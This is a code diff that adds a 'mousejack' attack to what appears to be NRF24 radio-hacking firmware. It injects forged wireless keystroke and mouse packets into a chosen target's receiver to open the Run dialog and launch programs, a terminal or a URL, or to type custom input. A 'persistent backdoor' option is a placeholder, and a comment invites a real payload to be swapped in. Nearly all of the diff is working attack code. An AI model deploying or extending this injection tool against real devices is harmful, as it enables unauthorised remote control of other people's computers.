@@ -735,3 +735,205 @@ void nrf_sweep_jam(int startCh, int stopCh, int step, int dwellMs, bool noise) {
 }
 
 void nrf_toolkit() { nrf_hijack(); }
+
+void nrf_mousejack() {
+    if (!nrf_start()) {
+        Serial.println("Fail Starting radio for mousejack");
+        displayError("NRF24 not found");
+        delay(500);
+        return;
+    }
+
+    Target target = pickTarget();
+    if (target.addr[0] == 0 && target.addr[1] == 0 && target.addr[2] == 0 && target.addr[3] == 0 &&
+        target.addr[4] == 0) {
+        return;
+    }
+
+    configureTx(target.channel, target.addr);
+
+    int modeIdx = 0;
+    const int modeCount = 7;
+    const char *modes[modeCount] = {
+        "Calc launcher", "CMD/Terminal", "Rick roll URL", "Persistent backdoor", "Custom text", "Custom mouse", "Back"
+    };
+    int lastDraw = -1;
+
+    while (true) {
+        if (modeIdx != lastDraw) {
+            drawPickHeader("Mousejack Attack");
+            tft.setTextSize(FM);
+            tft.printf("Target: %s\n", addrToString(target.addr).c_str());
+            tft.printf("CH: %u  [%s]\n", target.channel, target.vendor.c_str());
+            tft.println("---");
+            for (int i = 0; i < modeCount; ++i) {
+                tft.print((i == modeIdx) ? ">" : " ");
+                tft.print(" ");
+                tft.println(modes[i]);
+            }
+            lastDraw = modeIdx;
+        }
+
+        if (check(NextPress)) {
+            modeIdx = (modeIdx + 1) % modeCount;
+            delay(120);
+        } else if (check(PrevPress)) {
+            modeIdx = (modeIdx + modeCount - 1) % modeCount;
+            delay(120);
+        } else if (check(SelPress)) {
+            configureTx(target.channel, target.addr);
+            drawPickHeader("Mousejack Attack");
+            tft.printf("Target: %s\n", addrToString(target.addr).c_str());
+            tft.printf("CH: %u\n", target.channel);
+            tft.println("Executing...\n");
+
+            if (modeIdx == 0) {
+                // Launch calculator
+                tft.println("Launching calculator...");
+                #ifdef _WIN32
+                String cmd = "calc";
+                #else
+                String cmd = "gnome-calculator";
+                #endif
+
+                // Win+R / Cmd+Space
+                uint8_t winR[] = {0x08, 0, 0x15, 0, 0, 0, 0, 0}; // GUI + R
+                sendPayload(winR, 8, 3);
+                delay(200);
+                uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
+                sendPayload(rel, 8, 2);
+                delay(300);
+
+                // Type "calc" or "gnome-calculator"
+                for (size_t i = 0; i < cmd.length(); ++i) {
+                    uint8_t mod = 0, key = 0;
+                    if (asciiToHid(cmd[i], mod, key)) {
+                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
+                        sendPayload(pkt, 8, 2);
+                        sendPayload(rel, 8, 2);
+                        delay(20);
+                    }
+                }
+
+                // Press Enter
+                uint8_t enter[] = {0, 0, 0x28, 0, 0, 0, 0, 0};
+                sendPayload(enter, 8, 3);
+                sendPayload(rel, 8, 2);
+
+            } else if (modeIdx == 1) {
+                // Open CMD/Terminal and show message
+                tft.println("Opening terminal...");
+
+                // Win+R
+                uint8_t winR[] = {0x08, 0, 0x15, 0, 0, 0, 0, 0};
+                sendPayload(winR, 8, 3);
+                delay(200);
+                uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
+                sendPayload(rel, 8, 2);
+                delay(300);
+
+                // Type "cmd"
+                String cmd = "cmd";
+                for (size_t i = 0; i < cmd.length(); ++i) {
+                    uint8_t mod = 0, key = 0;
+                    if (asciiToHid(cmd[i], mod, key)) {
+                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
+                        sendPayload(pkt, 8, 2);
+                        sendPayload(rel, 8, 2);
+                        delay(20);
+                    }
+                }
+
+                // Press Enter
+                uint8_t enter[] = {0, 0, 0x28, 0, 0, 0, 0, 0};
+                sendPayload(enter, 8, 3);
+                sendPayload(rel, 8, 2);
+                delay(500);
+
+                // Type message
+                String msg = "echo Mousejacked!";
+                for (size_t i = 0; i < msg.length(); ++i) {
+                    uint8_t mod = 0, key = 0;
+                    if (asciiToHid(msg[i], mod, key)) {
+                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
+                        sendPayload(pkt, 8, 2);
+                        sendPayload(rel, 8, 2);
+                        delay(20);
+                    }
+                }
+
+                sendPayload(enter, 8, 3);
+                sendPayload(rel, 8, 2);
+
+            } else if (modeIdx == 2) {
+                // Rick roll - open browser with YouTube URL
+                tft.println("Opening Rick Roll...");
+
+                uint8_t winR[] = {0x08, 0, 0x15, 0, 0, 0, 0, 0};
+                sendPayload(winR, 8, 3);
+                delay(200);
+                uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
+                sendPayload(rel, 8, 2);
+                delay(300);
+
+                String url = "https://bit.ly/3dQnvFH";
+                for (size_t i = 0; i < url.length(); ++i) {
+                    uint8_t mod = 0, key = 0;
+                    if (asciiToHid(url[i], mod, key)) {
+                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
+                        sendPayload(pkt, 8, 2);
+                        sendPayload(rel, 8, 2);
+                        delay(15);
+                    }
+                }
+
+                uint8_t enter[] = {0, 0, 0x28, 0, 0, 0, 0, 0};
+                sendPayload(enter, 8, 3);
+                sendPayload(rel, 8, 2);
+
+            } else if (modeIdx == 3) {
+                // Persistent backdoor (creates scheduled task or startup item)
+                tft.println("Creating backdoor...");
+                tft.println("(Demo mode - not real)");
+
+                // This is a demonstration payload - replace with actual pentesting payload if authorized
+                String msg = "echo Backdoor demo";
+                for (size_t i = 0; i < msg.length(); ++i) {
+                    uint8_t mod = 0, key = 0;
+                    if (asciiToHid(msg[i], mod, key)) {
+                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
+                        sendPayload(pkt, 8, 2);
+                        uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
+                        sendPayload(rel, 8, 2);
+                        delay(20);
+                    }
+                }
+
+            } else if (modeIdx == 4) {
+                // Custom text injection
+                keyboardInject(target);
+                lastDraw = -1; // Force redraw
+                continue;
+
+            } else if (modeIdx == 5) {
+                // Custom mouse injection
+                mouseInject(target);
+                lastDraw = -1; // Force redraw
+                continue;
+
+            } else {
+                break; // Back
+            }
+
+            if (modeIdx < 4) {
+                tft.println("\nDone! Esc to continue");
+                while (!check(EscPress)) delay(50);
+            }
+            lastDraw = -1; // Force redraw
+        } else if (check(EscPress)) {
+            break;
+        }
+    }
+
+    NRFradio.powerDown();
+}
